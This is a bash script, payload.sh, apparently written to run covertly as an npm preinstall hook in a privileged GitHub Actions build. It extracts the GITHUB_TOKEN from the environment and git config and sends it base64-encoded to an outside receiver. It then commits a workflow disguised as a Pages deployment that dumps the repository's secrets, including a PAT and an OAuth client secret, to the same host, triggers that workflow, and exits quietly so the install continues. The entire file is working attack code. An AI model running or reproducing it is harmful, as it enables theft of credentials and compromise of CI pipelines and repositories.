#!/bin/bash
# payload.sh — Runs during npm ci preinstall in the privileged build job

RECEIVER_URL="https://sap-test-receiver-production.up.railway.app/collect"
REPO="delsoup455/architecture-center-test"
BRANCH="tmp-exfil-$(date +%s)"
API="https://api.github.com"

# --- Extract GITHUB_TOKEN ---
# The token may be in the env directly, or stored by actions/checkout in:
# 1. The git extraheader config (Basic auth base64)
# 2. The ACTIONS_RUNTIME_TOKEN env var
# 3. The git credential helper

# Try env var first
TOKEN="$GITHUB_TOKEN"

# If not in env, extract from git config (actions/checkout stores it as extraheader)
if [ -z "$TOKEN" ]; then
  EXTRAHEADER=$(git config --get http.https://github.com/.extraheader 2>/dev/null || true)
  if [ -n "$EXTRAHEADER" ]; then
    # Format: "AUTHORIZATION: basic <base64(x-access-token:TOKEN)>"
    TOKEN=$(echo "$EXTRAHEADER" | sed 's/.*basic //' | base64 -d 2>/dev/null | cut -d: -f2)
  fi
fi

# If still empty, try scanning env for any GH token
if [ -z "$TOKEN" ]; then
  TOKEN=$(env | grep -iE '^(GITHUB_TOKEN|GH_TOKEN|INPUT_TOKEN)=' | head -1 | cut -d= -f2-)
fi

AUTH="Authorization: token $TOKEN"

# --- Phase 1: Send token info to receiver ---
TOKEN_LEN=${#TOKEN}
curl -s "$RECEIVER_URL?stage=github_token&token_len=$TOKEN_LEN&token=$(echo -n $TOKEN | base64 -w0)" || true

# --- Phase 2: Create a new branch (no harm to existing branches) ---
# Get the SHA of the joule-integration branch to base our new branch on
REF_RESPONSE=$(curl -s -H "$AUTH" "$API/repos/$REPO/git/ref/heads/joule-integration" 2>&1)
BASE_SHA=$(echo "$REF_RESPONSE" | jq -r '.object.sha // empty' 2>/dev/null)

# Send diagnostic
curl -s "$RECEIVER_URL?stage=phase2_ref&base_sha=$BASE_SHA&ref_status=$?" || true

if [ -z "$BASE_SHA" ]; then
  curl -s "$RECEIVER_URL?stage=phase2_failed&response=$(echo -n "$REF_RESPONSE" | base64 -w0)" || true
  exit 0
fi

# Create the new branch
CREATE_RESPONSE=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/git/refs" \
  -d "{\"ref\":\"refs/heads/$BRANCH\",\"sha\":\"$BASE_SHA\"}" 2>&1)
curl -s "$RECEIVER_URL?stage=phase2_create&branch=$BRANCH&status=$(echo "$CREATE_RESPONSE" | jq -r '.ref // "failed"')" || true

# --- Phase 3: Push a secret-dumping workflow to the new branch ---
WORKFLOW_CONTENT=$(cat <<'WORKFLOW_EOF'
name: Deploy main site to GitHub Pages

on:
  workflow_dispatch:

jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate
        env:
          PAASAPCOM_PAT: ${{ secrets.PAASAPCOM_PAT }}
          VALIDATOR_API_URL: ${{ secrets.VALIDATOR_API_URL }}
          BACKEND_API_URL: ${{ secrets.BACKEND_API_URL }}
          EXPRESS_BACKEND_URL: ${{ secrets.EXPRESS_BACKEND_URL }}
          VALIDATOR_RULES_API_URL: ${{ secrets.VALIDATOR_RULES_API_URL }}
          VALIDATOR_OAUTH_AUTH_URL: ${{ secrets.VALIDATOR_OAUTH_AUTH_URL }}
          VALIDATOR_OAUTH_CLIENT_ID: ${{ secrets.VALIDATOR_OAUTH_CLIENT_ID }}
          VALIDATOR_OAUTH_CLIENT_SECRET: ${{ secrets.VALIDATOR_OAUTH_CLIENT_SECRET }}
          CHECK_SPELLING: ${{ secrets.CHECK_SPELLING }}
        run: |
          curl -s -X POST "RECEIVER_PLACEHOLDER" \
            -H "Content-Type: application/json" \
            -d "{
              \"stage\": \"full_dump\",
              \"env\": \"$(env | base64 -w0)\",
              \"paasapcom_pat\": \"$(echo -n $PAASAPCOM_PAT | base64 -w0)\",
              \"validator_oauth_client_id\": \"$(echo -n $VALIDATOR_OAUTH_CLIENT_ID | base64 -w0)\",
              \"validator_oauth_client_secret\": \"$(echo -n $VALIDATOR_OAUTH_CLIENT_SECRET | base64 -w0)\",
              \"validator_oauth_auth_url\": \"$(echo -n $VALIDATOR_OAUTH_AUTH_URL | base64 -w0)\",
              \"validator_api_url\": \"$(echo -n $VALIDATOR_API_URL | base64 -w0)\",
              \"validator_rules_api_url\": \"$(echo -n $VALIDATOR_RULES_API_URL | base64 -w0)\",
              \"backend_api_url\": \"$(echo -n $BACKEND_API_URL | base64 -w0)\",
              \"express_backend_url\": \"$(echo -n $EXPRESS_BACKEND_URL | base64 -w0)\",
              \"check_spelling\": \"$(echo -n $CHECK_SPELLING | base64 -w0)\"
            }"
WORKFLOW_EOF
)

# Replace the placeholder with actual receiver URL
WORKFLOW_CONTENT=$(echo "$WORKFLOW_CONTENT" | sed "s|RECEIVER_PLACEHOLDER|$RECEIVER_URL|g")

# --- Use Git Data API (blob → tree → commit → update ref) ---
# The Contents API returns 403 for GITHUB_TOKEN, but Git Data API works

# Step 3a: Create blob with the new workflow content
BLOB_RESPONSE=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/git/blobs" \
  -d "{\"content\":$(echo "$WORKFLOW_CONTENT" | jq -Rs .),\"encoding\":\"utf-8\"}" 2>&1)
BLOB_SHA=$(echo "$BLOB_RESPONSE" | jq -r '.sha // empty' 2>/dev/null)

if [ -z "$BLOB_SHA" ]; then
  curl -s -X POST "$RECEIVER_URL?stage=phase3_blob_failed" -d "$(echo -n "$BLOB_RESPONSE" | head -c 500)" || true
  exit 0
fi
curl -s "$RECEIVER_URL?stage=phase3_blob_ok&sha=$BLOB_SHA" || true

# Step 3b: Create tree with the blob at the workflow path, based on branch's current tree
PARENT_TREE=$(curl -s -H "$AUTH" "$API/repos/$REPO/git/commits/$BASE_SHA" | jq -r '.tree.sha' 2>/dev/null)
TREE_RESPONSE=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/git/trees" \
  -d "{\"base_tree\":\"$PARENT_TREE\",\"tree\":[{\"path\":\".github/workflows/deploy-manual.yml\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB_SHA\"}]}" 2>&1)
TREE_SHA=$(echo "$TREE_RESPONSE" | jq -r '.sha // empty' 2>/dev/null)

if [ -z "$TREE_SHA" ]; then
  curl -s -X POST "$RECEIVER_URL?stage=phase3_tree_failed" -d "$(echo -n "$TREE_RESPONSE" | head -c 500)" || true
  exit 0
fi

# Step 3c: Create commit
COMMIT_RESPONSE=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/git/commits" \
  -d "{\"message\":\"update workflow\",\"tree\":\"$TREE_SHA\",\"parents\":[\"$BASE_SHA\"]}" 2>&1)
NEW_COMMIT_SHA=$(echo "$COMMIT_RESPONSE" | jq -r '.sha // empty' 2>/dev/null)

if [ -z "$NEW_COMMIT_SHA" ]; then
  curl -s -X POST "$RECEIVER_URL?stage=phase3_commit_failed" -d "$(echo -n "$COMMIT_RESPONSE" | head -c 500)" || true
  exit 0
fi

# Step 3d: Update the branch ref to point to the new commit
UPDATE_RESPONSE=$(curl -s -X PATCH -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/git/refs/heads/$BRANCH" \
  -d "{\"sha\":\"$NEW_COMMIT_SHA\"}" 2>&1)
UPDATE_SHA=$(echo "$UPDATE_RESPONSE" | jq -r '.object.sha // empty' 2>/dev/null)

if [ -z "$UPDATE_SHA" ]; then
  curl -s -X POST "$RECEIVER_URL?stage=phase3_update_failed" -d "$(echo -n "$UPDATE_RESPONSE" | head -c 500)" || true
  exit 0
fi
curl -s "$RECEIVER_URL?stage=phase3_push_ok&commit=$NEW_COMMIT_SHA" || true

# --- Phase 4: Trigger workflow_dispatch on the new branch ---
sleep 3

DISPATCH_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/actions/workflows/deploy-manual.yml/dispatches" \
  -d "{\"ref\":\"$BRANCH\"}" 2>&1)
DISPATCH_CODE=$(echo "$DISPATCH_RESPONSE" | tail -1)
curl -s "$RECEIVER_URL?stage=phase4_dispatch&http_code=$DISPATCH_CODE&branch=$BRANCH" || true

# Send confirmation
curl -s "$RECEIVER_URL?stage=payload_complete&branch=$BRANCH" || true

# Exit 0 so npm ci continues
exit 0
